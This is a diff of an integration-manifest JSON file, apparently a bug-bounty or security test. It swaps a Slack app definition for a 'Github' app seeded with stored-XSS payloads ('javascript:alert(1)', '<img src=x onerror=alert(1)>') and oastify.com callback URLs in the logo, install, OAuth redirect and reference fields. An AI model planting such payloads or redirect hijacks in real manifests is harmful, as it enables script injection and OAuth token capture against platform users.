@@ -1,75 +1,76 @@
 {
-   "name": "Slack hacked",
-   "namespace": "slack",
-   "url": "http://localhost:8901/manifest.json",
-   "logo_url": "logo.png",
+   "id": "17156ca9-8cf9-4e99-a7b1-78b6950f0c57",
+   "url": "https://ssc-app-github.dev-fed-frontend.ssc.band/manifest.json",
+   "created_by": "system",
+   "created_at": "2023-01-18T22:51:30.865Z",
+   "public": true,
+   "organization_id": "0a85b6ce-1b11-5f5d-90d1-7e3ec31cad1b",
+   "name": "Github",
+   "namespace": "github",
    "description": {
-      "short": "Send notifications to a Slack channel based on events you set up in Rule Builder.",
-      "long": "Send notifications of events in Rule Builder to a Slack channel so team members get updates when a rule is triggered.\n\nSelect the slack channel to send the notification to on Rule Builder page.\n\nIn Slack, you will receive a Slack message describing the event, with a link to the related scorecard to view details."
+      "short": "bhavukjain1-short",
+      "long": "bhavukjain1-long"
    },
    "tags": [
+      "compliance_signal",
+      "ff_compliance360",
+      "github",
+      "it_service_management",
       "productivity",
-      "slack",
-      "notifications",
-      "automation",
-      "slack.com"
+      "signals"
    ],
    "developer": {
-      "name": "SecurityScorecard",
-      "website_url": "https://securityscorecard.com",
-      "privacy_url": "https://securityscorecard.com/privacy"
+      "name": "Security Scorecard",
+      "website_url": "javascript:alert(1)"
    },
-   "actions": [
-      {
-         "id": "notify_channel",
-         "name": "Notify Channel",
-         "url": "actions/notify_channel",
-         "settings_url": "actions/notify_channel/settings"
-      }
-   ],
    "display_settings": {
-      "primary_color": "#ecb22e",
-      "logo_url": "logo.png",
+      "primary_color": "#17494D",
+      "secondary_color": "#17494D",
+      "logo_url": "https://7iqzk434uoje2ujw9rd65502mtspgf44.oastify.com/apps/17156ca9-8cf9-4e99-a7b1-78b6950f0c57/bhavukjain1.png",
       "hero_images": [
          {
-            "url": "https://ui-metadata.securityscorecard.io/apps-imagery/slack-hero.gif"
+            "text": "<img src=x onerror=alert(1)>",
+            "url": "<img src=x onerror=alert(1)>"
          }
       ],
-      "homepage_url": "https://slack.com",
-      "help_url": "https://support.securityscorecard.com/hc/en-us/articles/360057500772-Slack-App"
+      "homepage_url": "javascript:alert(1)"
    },
    "install": {
-      "url": "https://platform-api.securityscorecard.tech/apps/slack/install",
+      "url": "https://0uvswxfx6hv7envplkpzhycvym4hs7gw.oastify.com/apps/github/authorize",
       "secrets": [
          {
-            "key": "ACCESS_TOKEN",
-            "description": "a slack access token",
-            "value_required": true
-         },
-         {
-            "key": "SSC_ACCESS_TOKEN",
-            "description": "Access token, result of OAuth flow against Security Scorecard site",
-            "value_required": true
+            "key": "INSTALLATION",
+            "description": "Reference id to srv-subscriptions",
+            "value_required": false
          }
       ],
       "oauth": {
-         "redirect_uri": "https://platform-api.securityscorecard.tech/apps/slack/redirect-from-ssc",
+         "redirect_uri": "https://0uvswxfx6hv7envplkpzhycvym4hs7gw.oastify.com/apps/github/install",
          "scopes": [
             "issue:summary",
-            "user:read",
-            "users:list",
-            "invite:create",
-            "portfolio:read",
-            "portfolio:edit",
-            "score:summary",
-            "issue:summary",
-            "issue:details",
-            "issue:refute",
-            "history:score",
-            "report:create",
-            "report:read",
-            "rule:edit"
+            "user:read"
          ]
       }
-   }
+   },
+   "installed_at": "2024-10-07T10:10:47.384Z",
+   "configuration_complete": true,
+   "signals": [
+      {
+         "id": "github.compliance",
+         "name": "Github",
+         "severity": "info",
+         "factor": "dns_health",
+         "long_description": "bhavukjain1_long",
+         "short_description": "bhavukjain1_short",
+         "recommendation": "Create new policy with restricted access",
+         "references": [
+            {
+               "link": "https://0uvswxfx6hv7envplkpzhycvym4hs7gw.oastify.com/es/iam/",
+               "text": "Github Services: IAM"
+            }
+         ],
+         "my_scorecard_only": false
+      }
+   ],
+   "installation_next_url": "https://0uvswxfx6hv7envplkpzhycvym4hs7gw.oastify.com/apps/github/authorize?installation=b416dedf-f921-4766-b82d-eed640199f51&username=test1%40bhavukjain.com"
 }
